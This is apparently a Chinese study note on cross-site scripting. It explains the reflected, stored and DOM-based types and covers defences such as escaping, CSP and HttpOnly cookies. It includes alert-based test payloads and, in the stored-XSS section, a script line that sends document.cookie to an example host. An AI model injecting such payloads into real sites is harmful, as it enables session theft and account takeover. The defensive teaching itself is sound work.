一、什么是XSS
    1、跨站脚本攻击（Cross Site Scripting，前端注入）
    2、注入攻击的本质是把用户输入的数据当作前端代码执行
    3、两个关键条件：用户能够控制输入；原本程序要执行的代码拼接了用户输入的数据。
    4、SQL注入拼接的是操作数据库的SQL语句。XSS拼接的是网页的HTML代码，可以拼接处合适的HTML代码去执行恶意JS语句。
二、XSS能做什么
    盗取Cookie并发送（频繁），document.cookie——读取cookie，然后使用AJAX发送数据。
    获取内网ip（攻击内网，扫描内网）。
    获取浏览器保存的明文密码。
    截取网页屏幕。
    网页上的键盘记录。
三、XSS攻击类型
    1、反射型XSS攻击
        攻击者发送给被攻击者一个邮件信息或者链接，当被攻击者点击并访问该链接时，就会想攻击者的目标服务器发起请求，此时根据请求返回相关的script代码，
        当浏览器解析这些script代码时，此时代码就会在浏览器执行，造成用户被攻击。
        ><img src=1 onerror="alert(/xss/)"/> 如果在输入框中输入该段代码，如果显示了/xss/则说明存在
        <input type = "text" value= "><img src=1 onerror="alert(/xss/)"/>">
    2、存储型XSS攻击
        存储型XSS攻击是持久性攻击方式，因为该攻击的代码会提交到服务器中的数据库进行保存。比如博客网站，用户可以在博客网站上发表博客，当用户写入js代码：
        <script>window.open("http://www.aaa.com?params="+document.cookie)</script>
        此时如果不处理，就会保存在服务器的数据库中，当其他用户访问该博客时，用户的浏览器就会执行这段script代码，此时本地的cookie就会发送到该网址上，
        造成cookei泄露。攻击者拿到cookie冒充用户身份，登陆账号。
        <img src="1" onerror="alert(/xss/)"/> 注入后刷新发现直接回显注入的东西，说明是存储型xss。
    3、DOM-based型XSS攻击
        在插入、修改页面的内容，如果用户在客户端输入的数据包含了恶意的js脚本，这些脚本又没有做过任何过滤处理的话，应用程序就会受到Dom-based XSS攻击。
        步骤：
        （1）攻击者构造出特殊的url，其中包含恶意代码。
        （2）用户打开带有恶意代码的url。
        （3）用户浏览器收到响应后解析执行，前端去除恶意代码并执行。
        （4）恶意代码窃取用户数据并发送到攻击者的网站冒充用户的行为。
四、XSS攻击预防
    1、输入过滤
    2、预防存储型和反射型XSS攻击
        （1）改为纯前端渲染，把代码和数据分开。
            浏览器先加载一个静态HTML，此HTML中不包含任何跟业务相关的数据，然后浏览器执行HTML中的JavaScript，通过Ajax加载业务数据，调用api更新到页面上。
        （2）对HTML做充分的转义。
            HTML转义通常只有一个规则，就是把 &、<、>、""、 ''、/ 这几个字符转义掉。
    3、预防DOM型XSS攻击
        DOM型XSS攻击实际上就是前端JavaScript代码不够严谨，把不可信的数据当作代码执行了。在使用.innerHTML，.outerHTML，document.write()时要特别小心，
        不要把不可信的数据当作HTML插入到页面上，应尽量使用.textConten，.setAttribute。
五、 其他XSS攻击预防
    1、CSP（Content Security Policy）
    严格的CSP在XSS的防范中可以起到以下作用：
        禁止加载外域代码，防止复杂的攻击逻辑。
        禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
        禁止內联脚本执行（规则较严格）。
        禁止未授权的脚本执行（新特性）。
        合理使用上报可以及时发现XSS，利于尽快修复问题。
    2、输入内容长度控制
        对于不受信任的输入，都应该限定在一个合理的长度，虽然无法完全防止XSS发生，但可以增加XSS攻击的难度。
    3、其他安全措施
        http-only cookie：禁止javascript读取某些敏感的cookie，攻击者完成xss注入后无法窃取此cookie。
        验证码：防止脚本冒充用户提交危险操作。

